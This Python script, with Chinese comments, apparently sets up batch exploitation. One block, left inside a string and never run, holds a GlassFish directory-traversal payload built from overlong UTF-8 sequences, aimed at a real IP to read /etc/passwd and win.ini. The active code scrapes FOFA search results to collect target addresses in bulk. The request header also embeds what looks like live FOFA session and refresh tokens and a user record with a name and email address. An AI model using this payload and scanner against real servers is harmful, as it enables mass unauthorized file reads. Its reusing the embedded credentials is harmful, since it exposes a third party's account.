import time

import requests,base64
from lxml import etree
'''
url="http://34.87.47.158:4848/"
payload_linux= '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_win='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'

# data_linux = requests.get(url+payload_linux)
# data_win = requests.get(url+payload_win)
data_linux = requests.get(url+payload_linux).status_code
data_win = requests.get(url+payload_win).status_code
# print(data_linux.content.decode('utf-8'))
# print('-----------------------------------------------------------')
# print(data_win.content.decode('utf-8'))
print(data_linux)
print('-----------------------------------------------------------')
print(data_win)
'''
'''
    如何实现漏洞的批量化
    1.获取可能存在漏洞的地址信息--借助FOFA进行获取目标
        1.1将请求的数据进行筛选
    2.批量请求地址信息进行判断是否存在-单线程和多线程
'''
def search_Data(search_data,yeshu):
    # search_data='"glassfish"&&port="4848"'
    search_data_bs = str(base64.b64encode(search_data.encode('utf-8')),"utf-8")
    # print(search_data_bs)
    header={
        'User-Agent':"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        'cookie':'befor_router=%2F; fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTAxMjY4LCJtaWQiOjEwMDA2MTcyOCwidXNlcm5hbWUiOiJvbGRsaXV0b3UiLCJleHAiOjE2MjAzMzA1MzV9.U9LNnXttu9VMX12F8JRXSuBxev_M1i_38oz42orEBXfwpaJHNg7gk3N7U8zZJCdx6MRrUlxJsD5CA_CbBtYESw; refresh_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTAxMjY4LCJtaWQiOjEwMDA2MTcyOCwidXNlcm5hbWUiOiJvbGRsaXV0b3UiLCJleHAiOjE2MjA1NDY1MzUsImlzcyI6InJlZnJlc2gifQ.QIkUcWYs1cLE6-wAYoJpm_aJNDjUn-bPBgu5rUquwqzibqoYwqyTgQbkQwC-7yJ2mjSU7tB6_9vDu6fuVfrL8w; Hm_lvt_b5514a35664fd4ac6a893a1e56956c97=1620204327,1620287248,1620287344; user=%7B%22id%22%3A101268%2C%22mid%22%3A100061728%2C%22is_admin%22%3Afalse%2C%22username%22%3A%22oldliutou%22%2C%22nickname%22%3A%22oldliutou%22%2C%22email%22%3A%221548648078%40qq.com%22%2C%22avatar_medium%22%3A%22https%3A%2F%2Fnosec.org%2Fmissing.jpg%22%2C%22avatar_thumb%22%3A%22https%3A%2F%2Fnosec.org%2Fmissing.jpg%22%2C%22key%22%3A%22%22%2C%22rank_name%22%3A%22%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%22%2C%22rank_level%22%3A0%2C%22company_name%22%3A%22oldliutou%22%2C%22coins%22%3A0%2C%22credits%22%3A0%2C%22expiration%22%3A%22-%22%2C%22login_at%22%3A0%7D; Hm_lpvt_b5514a35664fd4ac6a893a1e56956c97=1620295556'
    }
    for i in range(1,yeshu+1):
        print('-----------------------------------------打印第' + str(i) + '页---------------------------------------')
        url='https://fofa.so/result?page='+str(i)+'&page_size=10&qbase64=' #+"page"=+页数  页数用for循环，登录加上cookie头
        urls=url+search_data_bs
        result = requests.get(urls,headers=header).content
        # print(result.decode('utf-8'))
        time.sleep(1)
        # < span  class ="aSpan" > < a target="_blank" href="http://18.182.2.143:4848" >
        soup = etree.HTML(result)
        ip_data=soup.xpath('//span[@class="aSpan"]/a[@target="_blank"]/@href')
        ip_data='\n'.join(ip_data)
        with open(r'爬取ip.txt','a+') as f:
            f.write(ip_data+'\n')
            f.close()
        print(ip_data)
if __name__ == '__main__':
    search_Data('"HadSky轻论坛" && country="CN"',5)